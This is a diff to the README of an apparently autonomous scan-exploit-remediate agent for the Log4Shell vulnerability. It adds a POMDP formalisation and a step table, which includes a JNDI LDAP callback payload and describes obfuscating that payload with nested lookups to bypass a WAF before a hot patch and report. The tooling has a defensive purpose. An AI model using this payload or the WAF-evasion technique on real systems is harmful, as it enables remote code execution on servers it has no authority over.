@@ -62,24 +62,48 @@ The agent's software structure is developed following Hexagonal Architecture (Po
 
 ---
 
-## 🎯 Cognitive Loop Specification (Think-Act Loop)
+## 🎯 Mathematical Apparatus & Cognitive Loop Specification (Think-Act Loop)
 
-The agent decision-making model maps environment states $S$ to a discrete action space $A$. For each effector action, the posterior utility score is computed:
+The agent's decision-making process is formalized as a **Partially Observable Markov Decision Process (POMDP)**, represented by the tuple $\langle S, A, T, R, \Omega, O, \gamma \rangle$:
+* $S$ is the discrete state space of the target environment (port accessibility, entry parameters mapping, WAF presence, compromise status, patch application, compliance documentation status).
+* $A$ is the action space of effectors (execution of tools: `port_scanner`, `discovery`, `payload_generator`, `prober`, `semantic_fuzzer`, `remediator`, `reporter`, `stop`).
+* $\Omega$ is the observation space (received HTTP status codes, OOB TCP callbacks, filesystem events).
+* $O(o \mid s', a)$ is the observation function, determining the probability of receiving observation $o \in \Omega$ after executing action $a$.
 
-$$EfficiencyScore = \frac{SuccessCount}{UsageCount}$$
+### 1. Belief State Representation
+The agent does not have direct access to the hidden state $s \in S$ and operates on a belief state $b(s)$ — a probability distribution over $S$, maintained and dynamically updated within the thread-safe `KnowledgeBase`:
+* $b(S_{recon}) \in \{0, 1\}$ — network reconnaissance state (open/closed). Mapped to `ToolPerformance["port_scanner"]`.
+* $b(S_{discovery}) \in \{0, 1\}$ — input vectors mapping state (whether parameter locations are found). Mapped to `len(DiscoveryVectors) > 0`.
+* $b(S_{payload}) \in \{0, 1\}$ — exploit signature readiness. Mapped to `len(CustomPayloads) > 0`.
+* $b(S_{exploit}) \in \{0, 1\}$ — target compromise status (loot capture). Mapped to `len(Loot) > 0`.
+* $b(S_{patch}) \in \{0, 1\}$ — hot patch application status. Mapped to `PatchApplied`.
+* $b(S_{verify}) \in \{0, 1\}$ — remediation verification status. Mapped to `PatchVerified`.
+* $b(S_{report}) \in \{0, 1\}$ — compliance documentation status. Mapped to `ReportGenerated`.
 
-### Detailed Step-by-Step Scenario:
+### 2. Policy Mapping
+The agent's core decision loop `Think()` implements a deterministic policy $\pi: B \to A$ mapping the current belief state $b$ to the optimal effector action $a \in A$.
+
+### 3. Adaptive Learning & Effector Utility
+For each tool $a \in A$, the agent accumulates execution statistics in `ToolStats` and computes a utility metric (Efficiency Score):
+
+$$\text{EfficiencyScore}(a) = \frac{SuccessCount_a}{UsageCount_a}$$
+
+This is leveraged for adaptive pathfinding: if the initial exploitation attempt (`prober`) fails (meaning $\text{EfficiencyScore}(\text{prober}) = 0$), the agent infers WAF filtering, pivots its strategy to activate `semantic_fuzzer` for payload obfuscation, and retries exploitation.
+
+### Step-by-Step Execution Lifecycle:
 
 | Step | Selected Tool | Action & Underlying Process | Belief State Changes |
 | :--- | :--- | :--- | :--- |
-| **1** | `port_scanner` | Probe TCP socket at target port `:8080`. | HTTP port discovered. |
-| **2** | `discovery` | Analyze headers and page structure. | Parameter `X-Api-Version` identified as an entry point. |
-| **3** | `payload_generator` | Construct raw JNDI exploit signature. | Payloads updated with `\${jndi:ldap://127.0.0.1:1389/Exploit\}`. |
-| **4** | `prober` | Exploitation. Agent sends payload. | LDAP server captures incoming TCP redirect. RCE confirmed. |
-| **5** | `remediator` | Auto-Remediation. Hot patch target application config. | JVM properties re-initialized with `-Dlog4j2.formatMsgNoLookups=true`. |
-| **6** | `prober` | Verification (re-testing). | LDAP server monitors callback port. Connection absent $\rightarrow$ `PatchVerified = true`. |
-| **7** | `reporter` | Write compliance report. | Audit report generated at `reports/cve_2021_44228_report.md`. |
-| **8** | `stop` | Termination. | Finished. |
+| **1** | `port_scanner` | Probe TCP socket at target port `:8080`. | HTTP port discovered ($b(S_{recon}) = 1$). |
+| **2** | `discovery` | Analyze headers and page structure. | Parameter `X-Api-Version` identified as an entry point ($b(S_{discovery}) = 1$). |
+| **3** | `payload_generator` | Construct raw JNDI exploit signature. | Payloads updated with `\${jndi:ldap://127.0.0.1:1389/Exploit\}` ($b(S_{payload}) = 1$). |
+| **4** | `prober` | Exploitation attempt. Agent sends payload. | Blocked by target's WAF. $\text{EfficiencyScore}(\text{prober}) = 0$. |
+| **5** | `semantic_fuzzer` | Signature mutation via nested lookups. | Obfuscated payload generated ($b(S_{payload}) = 1$, WAF bypass). |
+| **6** | `prober` | Exploit payload delivery with mutated signature. | LDAP server captures incoming TCP redirect. RCE confirmed ($b(S_{exploit}) = 1$). |
+| **7** | `remediator` | Auto-Remediation. Hot patch target application config. | JVM properties re-initialized with `-Dlog4j2.formatMsgNoLookups=true` ($b(S_{patch}) = 1$). |
+| **8** | `prober` | Verification (re-testing). | LDAP server monitors callback port. Connection absent $\rightarrow$ $b(S_{verify}) = 1$. |
+| **9** | `reporter` | Write compliance report. | Audit report generated at `reports/cve_2021_44228_report.md` ($b(S_{report}) = 1$). |
+| **10**| `stop` | Termination. | Loop complete. |
 
 ---
 
